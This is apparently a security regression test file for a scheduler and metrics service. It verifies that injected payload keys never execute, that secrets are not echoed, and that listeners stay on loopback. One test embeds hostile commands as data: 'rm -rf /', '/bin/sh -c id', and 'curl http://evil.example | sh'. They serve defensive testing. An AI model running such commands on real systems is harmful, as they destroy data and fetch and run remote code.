import { afterAll, expect, test } from "bun:test";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { createScheduler, type SchedulerClock } from "../../src/main-session/scheduler";
import { loadWayCore, type WayCoreHandle } from "../../src/native-loader";
import { loadWayProfile } from "../../src/profile";
import { createRpcBridge } from "../../src/rpc-bridge";
import { RpcClient } from "../../src/rpc-client";

const temporaryDirectories: string[] = [];
const runningHttp: WayCoreHandle[] = [];
const runningRpc: WayCoreHandle[] = [];

afterAll(async () => {
	for (const core of runningHttp) {
		try {
			core.metricsHttpStop();
		} catch {
			// Already stopped.
		}
	}
	for (const core of runningRpc) {
		try {
			core.shutdownRpcServer();
		} catch {
			// Already stopped.
		}
	}
	await Bun.sleep(20);
	for (const directory of temporaryDirectories) fs.rmSync(directory, { recursive: true, force: true });
});

class TestClock implements SchedulerClock {
	#now: number;
	constructor(now: number) {
		this.#now = now;
	}
	now(): number {
		return this.#now;
	}
	advance(ms: number): void {
		this.#now += ms;
	}
	setTimeout(): unknown {
		return undefined;
	}
	clearTimeout(): void {}
}

function profileToml(root: string, extra = ""): string {
	const corpus = path.join(root, "corpus");
	const workspace = path.join(root, "workspace");
	for (const directory of [corpus, workspace]) fs.mkdirSync(directory);
	return `[corpus]
path = "${corpus}"
workspace = "${workspace}"

[injection]
files = []

[surfaces.owner]
id = "owner-dm"
platform = "test"
kind = "dm"
session_kind = "main"
${extra}`;
}

function schedulerFixture() {
	const root = fs.mkdtempSync(path.join(os.tmpdir(), "gajae-way-vb001-sched-"));
	temporaryDirectories.push(root);
	const stateDir = path.join(root, "state");
	fs.mkdirSync(stateDir);
	const profilePath = path.join(root, "profile.toml");
	fs.writeFileSync(profilePath, profileToml(root));
	const profile = loadWayProfile(profilePath);
	const core: WayCoreHandle = loadWayCore().WayCore.open(stateDir);
	const clock = new TestClock(Date.now());
	const systemEvents: string[] = [];
	const scheduler = createScheduler({
		core,
		profile,
		admitSystemEvent: async ({ text }) => {
			systemEvents.push(text);
		},
		submitFromRpc: async () => {
			throw new Error("submitFromRpc must not run in this probe");
		},
		turnState: () => "idle",
		tickMs: 1_000,
		clock,
		newId: (() => {
			let counter = 0;
			return () => {
				counter += 1;
				return `vb-${counter}`;
			};
		})(),
	});
	return { core, scheduler, clock, systemEvents };
}

function openCore(): WayCoreHandle {
	const stateDir = fs.mkdtempSync(path.join(os.tmpdir(), "gajae-way-vb001-core-"));
	temporaryDirectories.push(stateDir);
	return loadWayCore().WayCore.open(stateDir);
}

async function connectRpc(socketPath: string): Promise<RpcClient> {
	for (let attempt = 0; attempt < 100; attempt += 1) {
		if (fs.existsSync(socketPath)) {
			try {
				return await RpcClient.connect(socketPath);
			} catch {
				// Listener startup races are expected.
			}
		}
		await Bun.sleep(10);
	}
	throw new Error(`RPC socket did not become available: ${socketPath}`);
}

function firstNonLoopbackIPv4(): string | undefined {
	for (const addresses of Object.values(os.networkInterfaces())) {
		for (const address of addresses ?? []) {
			if (address.family === "IPv4" && !address.internal) return address.address;
		}
	}
	return undefined;
}

test("cron expressions that pin both day-of-month and day-of-week including */n and 1-31 are refused", async () => {
	const { scheduler } = schedulerFixture();
	for (const spec of ["0 9 15 * 1", "0 9 */1 * 1", "0 9 1-31 * 1", "0 9 1,15 * 1", "30 2 */2 * 0-6"]) {
		await expect(
			scheduler.handleRpc("schedule.create", {
				idempotency_key: `vb-cron-${spec}`,
				name: spec,
				kind: "cron",
				spec,
				timezone: "UTC",
				payload_kind: "system_event",
				payload: { text: "ambiguous" },
			}),
		).rejects.toMatchObject({ code: 1701 });
	}
});

test("native extra payload keys cannot introduce a command/script kind and are not executed", async () => {
	const { core, scheduler, clock, systemEvents } = schedulerFixture();

	expect(() =>
		core.scheduleJobUpsert({
			jobId: "vb-command",
			name: "command",
			kind: "every",
			spec: String(60_000),
			timezone: "UTC",
			payloadKind: "command",
			payloadJson: JSON.stringify({ text: "/bin/sh -c id" }),
			maxConsecutiveFailures: 8,
		}),
	).toThrow();

	core.scheduleJobUpsert({
		jobId: "vb-extra-json",
		name: "extra json",
		kind: "every",
		spec: String(60_000),
		timezone: "UTC",
		payloadKind: "system_event",
		payloadJson: JSON.stringify({
			text: "only the text may fire",
			argv: ["/bin/sh", "-c", "id"],
			command: "rm -rf /",
			script: "curl http://evil.example | sh",
		}),
		nextFireAtMs: clock.now() - 1,
		maxConsecutiveFailures: 8,
	});

	clock.advance(1);
	const claim = core.scheduleDueClaim(clock.now(), "vb-extra-run");
	expect(claim.claimed).toBe(true);
	await scheduler.reconcile();
	expect(systemEvents).toEqual(["only the text may fire"]);
	expect(core.scheduleRunList("vb-extra-json").runs.map((run) => run.outcome)).toContain("ok");
});

test("metrics HTTP 404 never echoes the target, query, headers, or body", async () => {
	const core = openCore();
	runningHttp.push(core);
	const port = core.metricsHttpStart(0);
	const secret = "sess_redteam_echo_9f3c_lease_DEADBEEF";

	const refused = await fetch(`http://127.0.0.1:${port}/metrics/${secret}?session_id=${secret}`, {
		method: "POST",
		headers: { "X-Session-Id": secret, "X-Lease-Id": secret, "X-Reason": secret },
		body: JSON.stringify({ session_id: secret, lease_id: secret, reason: secret }),
	});
	expect(refused.status).toBe(404);
	const body = await refused.text();
	expect(body).toBe("");
	expect(body).not.toContain(secret);

	const slash = await fetch(`http://127.0.0.1:${port}/metrics/`);
	expect(slash.status).toBe(404);
	expect(await slash.text()).toBe("");

	core.metricsHttpStop();
});

test("metrics HTTP is not reachable on a non-loopback interface", async () => {
	const lan = firstNonLoopbackIPv4();
	if (!lan) return;
	const core = openCore();
	runningHttp.push(core);
	const port = core.metricsHttpStart(0);
	try {
		const response = await fetch(`http://${lan}:${port}/metrics`, { signal: AbortSignal.timeout(400) });
		throw new Error(`non-loopback scrape succeeded with HTTP ${response.status}`);
	} catch (error) {
		expect(error instanceof Error ? error.message : String(error)).not.toContain("non-loopback scrape succeeded");
	} finally {
		core.metricsHttpStop();
	}
});

test("a top-level [metrics] table cannot enable the listener by sneaking past tunables", () => {
	const root = fs.mkdtempSync(path.join(os.tmpdir(), "gajae-way-vb001-metrics-table-"));
	temporaryDirectories.push(root);
	const profilePath = path.join(root, "profile.toml");
	fs.writeFileSync(
		profilePath,
		`${profileToml(root)}
[metrics]
http_enabled = true
bind_addr = "0.0.0.0"
`,
	);
	expect(() => loadWayProfile(profilePath)).toThrow();
});

test("tunables.metrics.bind_addr is ignored and cannot enable a non-loopback bind", async () => {
	const root = fs.mkdtempSync(path.join(os.tmpdir(), "gajae-way-vb001-bind-addr-"));
	temporaryDirectories.push(root);
	const profilePath = path.join(root, "profile.toml");
	fs.writeFileSync(
		profilePath,
		`${profileToml(root)}
[tunables.metrics]
http_enabled = true
bind_addr = "0.0.0.0"
port = 0
`,
	);
	const profile = loadWayProfile(profilePath);
	const metrics = (profile.tunables.tunables as Record<string, unknown> | undefined)?.metrics as
		| Record<string, unknown>
		| undefined;
	expect(metrics?.http_enabled).toBe(true);
	expect(metrics?.bind_addr).toBe("0.0.0.0");

	const core = openCore();
	runningHttp.push(core);
	const extra = core as unknown as { metricsHttpStart: (port: number, addr?: string) => number };
	const port = extra.metricsHttpStart(0, "0.0.0.0");
	const lan = firstNonLoopbackIPv4();
	if (lan) {
		try {
			const response = await fetch(`http://${lan}:${port}/metrics`, { signal: AbortSignal.timeout(400) });
			throw new Error(`bind_addr extra argument escaped loopback with HTTP ${response.status}`);
		} catch (error) {
			expect(error instanceof Error ? error.message : String(error)).not.toContain("escaped loopback");
		}
	}
	const loopback = await fetch(`http://127.0.0.1:${port}/metrics`);
	expect(loopback.status).toBe(200);
	core.metricsHttpStop();
});

test("failed-closed UDS fences every schedule.* method with 1000 and still answers way.metrics", async () => {
	const stateDir = fs.mkdtempSync(path.join(os.tmpdir(), "gajae-way-vb001-uds-"));
	temporaryDirectories.push(stateDir);
	const core = loadWayCore().WayCore.open(stateDir);
	runningRpc.push(core);
	const socketPath = path.join(stateDir, "rpc.sock");
	core.startRpcServer(socketPath, createRpcBridge(core));
	core.setRpcHealth("failed_closed", "vb001_secret_reason");
	core.gatewayMetaTransaction({
		expected: [],
		puts: [
			{ key: "bootstrap_state", value: "FAILED_CLOSED" },
			{ key: "failed_closed_reason", value: JSON.stringify("vb001_secret_reason") },
			{ key: "failed_closed_since_ms", value: String(Date.now() - 5_000) },
		],
		deletes: [],
	});

	const client = await connectRpc(socketPath);
	try {
		for (const method of [
			"schedule.create",
			"schedule.update",
			"schedule.delete",
			"schedule.get",
			"schedule.list",
			"schedule.runs",
			"schedule.run_now",
		]) {
			const response = await client.request(method, { idempotency_key: `vb-${method}`, job_id: "none" });
			expect(response.error?.code).toBe(1000);
		}

		const metrics = await client.request("way.metrics", {});
		expect(metrics.error).toBeUndefined();
		const payload = JSON.stringify(metrics.result ?? {});
		expect(payload).toMatch(/failed_closed/i);
	} finally {
		client.close();
		core.shutdownRpcServer();
	}
});

test("HTTP metrics while failed-closed reports duration and withholds the reason", async () => {
	const core = openCore();
	runningHttp.push(core);
	const reason = "vb001_http_secret_reason_xyz";
	core.gatewayMetaTransaction({
		expected: [],
		puts: [
			{ key: "bootstrap_state", value: "FAILED_CLOSED" },
			{ key: "failed_closed_reason", value: JSON.stringify(reason) },
			{ key: "failed_closed_since_ms", value: String(Date.now() - 90_000) },
		],
		deletes: [],
	});
	const port = core.metricsHttpStart(0);
	const body = await (await fetch(`http://127.0.0.1:${port}/metrics`)).text();
	expect(body).toMatch(/gajaeway_failed_closed_seconds [1-9]/);
	expect(body).not.toContain(reason);
	expect(body).not.toContain("failed_closed_reason");
	core.metricsHttpStop();
});

test("deleted Discord protocol files stay gone", () => {
	const root = path.resolve(import.meta.dir, "..", "..");
	for (const relative of [
		"src/adapter/discord/ack.ts",
		"src/adapter/discord/outbox.ts",
		"src/adapter/discord/route.ts",
	]) {
		expect(fs.existsSync(path.join(root, relative))).toBe(false);
	}
});
